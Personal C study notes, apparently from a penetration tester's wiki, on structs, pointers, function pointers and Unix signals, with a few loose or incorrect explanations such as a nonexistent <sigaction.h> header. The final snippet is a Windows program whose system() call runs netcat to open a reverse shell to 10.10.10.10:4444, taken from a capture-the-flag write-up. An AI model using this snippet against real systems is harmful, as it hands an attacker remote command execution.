

Structs
```c
struct rectangle {
  int width;
  int height;
};
 struct rectangle my_rec = { 1, 2 }; // Fields can be initialized immediately

  // Access struct members with .
  my_rec.width = 10;
  my_rec.height = 20;

  // You can declare pointers to structs
  struct rectangle *my_rec_ptr = &my_rec;

  // Use dereferencing to set struct pointer members...
  (*my_rec_ptr).width = 30;

  // ... or even better: prefer the -> shorthand for the sake of readability
  my_rec_ptr->height = 10; // Same as (*my_rec_ptr).height = 10;
```

Pointers - [recommended viewing Dave's Garage Youtube video](https://www.youtube.com/watch?v=IrGjyfBC-u0) 
```c
// Pointer are stored memory addresses, they point to memory address where values are stored
// Indirection - a pointer hold the address of values 
// Data at that address that the pointer is pointing to can be access and tranformed

// create a pointer of type byte pointing to memory address 4321;
byte * myPointer = (byte *) 4321;
// Change the value at the point
*myPointer = 0;

// class.memberVariable is member variable of the class 
class->memberVariable // goto to the object pointed to and then get member variable by this name, indicates a pointer to the object, not reference to itself!

// if you do not need to retrieve an entire struct in a function call use pointers
// Passed-by-value retrieve a complete copy, Passed-by-Reference means passing an object in the form of pointer
// One entire structure Vs. One or more Pointer  
int getTotalTheMemberVars(someStruct * pStruct)
{
	return pStruct->PointersToOtherPointers + pStruct->PointersToOtherStructs;
}

// Pointer pointing to the first element of an Array in memory, with the length of the array is like using the array without loading it on to the stack
// The array is "syntactic sugar" for the memory address
// char * contains the address of the first byte of a string in memory
// The size of an array is its actual size, where the pointers is system dependent 32-bit and 64bit
char someText[] = "Subscribe to Dave's Garage on Youtube, he bought Pinball on Windows amongst alot other things!"; // \x00 terminates a string! 
char * pSomeText = someText; 
int aPinballLoses[] = { 1, 2, 3, 4, 5};
int * pPinballLoses = aPinballLoses;

// Pointer arithmetic
// Move by the size of the type that it points to, not one byte!
// Increments point by a single byte
pSomeText++; // One char is one byte move 1 * 8 bits = 1 byte
pPinballLoses++; // 32-bit integers is a 4 byte move 8 + 8 + 8 + 8 or 4*8 = 32 

// Pointers to pointers
//pIndirectPlugOfThePlugOfTheVideo 
//Points to...
//pMicrosoftAndAIModelsIntoResurrectingPinball
char * pMicrosoftAndAIModelsIntoResurrectingPinball = "Microsoft putting Pinball on Windows 11 will make some people switch Windows 11";
char ** pIndirectPlugOfThePlugOfTheVideo = &pMicrosoftAndAIModelsIntoResurrectingPinball;
// So
return *pIndirectPlugOfThePlugOfTheVideo;
// will just return ... pMicrosoftAndAIModelsIntoResurrectingPinball 


// Null != Uninitialised != Void pointer 
// Null pointer points to 0, it is initialed to 0
// Uninitialised pointer random value till it is initialised
// Void pointer is just the address and is not type defined and must be cast to a object pointer before use. It assigned nil type information. Malloc API has allocate memory that can then be told what type of object will stored at that memory
void*


// Function Pointer is a pointer to a function 
// Beware readability
int add(int a, int b) 
{
	return a + b;
}
// (*pAdd) requires brackets for operator precedence
int (*pAdd)(int,int) = add;
// Bracket are also required for calling a function pointer
int sum = (*pAdd)(5, 3);

```

Processes - Unix
```c
#include <signal.h>
// This is more portable
#include <sigaction.h>


// Handler is a function
// User defined signals
SIGUSR1;
SIGUSR2;
// SegFault Signal
SIGSEGV;

sigaction(SIGINT, handler);
sigaction(SIGTERM, handler);

signal(SIGINT, handler);
signal(SIGTERM, handler);
// SIGKILL cannot be handler - oreder not a request
```


Simple use system to call another binary - see [[Compiling-Exploits]]
```c
#include "stdlib.h"
//#include "stdafx.h" speeds up compile time
// i686-w64-mingw32-gcc shell.c -o shell.exe
// x86_64-w64-mingw32 shell.c -o shell.exe

// Originally from https://snowscan.io/htb-writeup-giddy/#
// But you could replace the system call with anything
int main()
{
    system("nc.exe -e cmd.exe 10.10.10.10 4444");
    return 0;
}
```


## References

[Windows - C Language Reference](https://learn.microsoft.com/en-us/cpp/c-language/c-language-reference?view=msvc-170)
[GCC](https://linux.die.net/man/1/gcc)
[XinYminutesC](https://learnxinyminutes.com/docs/c/)
[Jacob Sorber Programming with Processes](https://www.youtube.com/playlist?list=PL9IEJIKnBJjFNNfpY6fHjVzAwtgRYjhPw)